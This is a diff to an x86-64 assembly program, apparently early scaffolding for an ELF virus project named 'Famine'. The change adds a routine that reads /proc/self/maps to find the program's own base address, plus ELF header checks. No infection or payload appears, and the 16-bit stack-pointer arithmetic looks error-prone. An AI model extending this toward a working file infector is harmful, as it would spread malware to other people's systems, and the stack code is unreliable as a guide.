@@ -75,6 +75,8 @@ struc Elf64_Shdr
 endstruc
 
 _start:
+    call get_base_address
+
     mov rax, SYS_OPEN
     mov rsi, O_RDONLY
     lea rdi, [rel file_path]
@@ -107,8 +109,8 @@ _start:
     mov rdi, 0
     syscall
 
+; elf64_ident_check
 elf64_ident_check:
-    ; magic numbers in header (0x7f + 'ELF')
     mov eax, DWORD [rdi]
     cmp eax, (ELFMAG3 << 24) | (ELFMAG2 << 16) | (ELFMAG1 << 8) | (ELFMAG0)
     jne not_elf
@@ -129,17 +131,83 @@ check_padding:
     loop check_padding
 
     ret
+; elf64_ident_check
 
+; get_base_address
+get_base_address:
+    mov rsi, O_RDONLY
+    lea rdi, [rel proc_self_maps]
+    mov rax, SYS_OPEN
+    syscall
+    cmp eax, 0
+    jl error
+
+    push rax
+
+    sub sp, 16
+
+    xor r10, r10
+    xor r8, r8
+    xor rdi, rdi
+    xor rdx, rdx
+    xor rbx, rbx
+
+    mov rdx, 1
+    lea rsi, [rsp]
+    mov edi, eax
+read_proc_map:
+    mov rax, SYS_READ
+    syscall
+
+    cmp eax, 1
+    jl error
+
+    cmp BYTE [rsp], '-'
+    je break
+    inc r10b
+    mov r8b, BYTE [rsp]
+
+    cmp r8b, '9'
+    jle num
+alpha:
+    sub r8b, 'a' - 10
+    jmp load
+num:
+    sub r8b, '0'
+load:
+    shl rbx, 4
+    or rbx, r8
+    add rsp, 1
+    lea rsi, [rsp]
+    jmp read_proc_map
+break:
+    sub sp, r10w
+    add sp, 16
+
+    pop rdi
+    mov rax, SYS_CLOSE
+    syscall
+    cmp eax, 0
+    jl error
+
+    ret
+; get_base_address
+
+; error
 error:
     mov rax, SYS_EXIT
     mov rdi, 1
     syscall
+; error
 
+; success
 success:
     mov rax, SYS_EXIT
     mov rdi, 0
     syscall
+; success
 
+; not_elf
 not_elf:
     add rsp, 16
     mov rax, SYS_WRITE
@@ -149,7 +217,9 @@ not_elf:
     syscall
 
     jmp success
+; not_elf
 
+; not_64_bit
 not_64_bit:
     add rsp, 16
     mov rax, SYS_WRITE
@@ -159,10 +229,15 @@ not_64_bit:
     syscall
 
     jmp success
+; not_64_bit
 
+proc_self_exe:
+    db "/proc/self/exe", 0
+proc_self_maps:
+    db "/proc/self/maps", 0
 not_64_bit_msg:
-    db "Not a 64 bit ELF",10
+    db "Not a 64 bit ELF", 10
 not_elf_msg:
-    db "Not an ELF",10
+    db "Not an ELF", 10
 file_path:
     db "Famine", 0
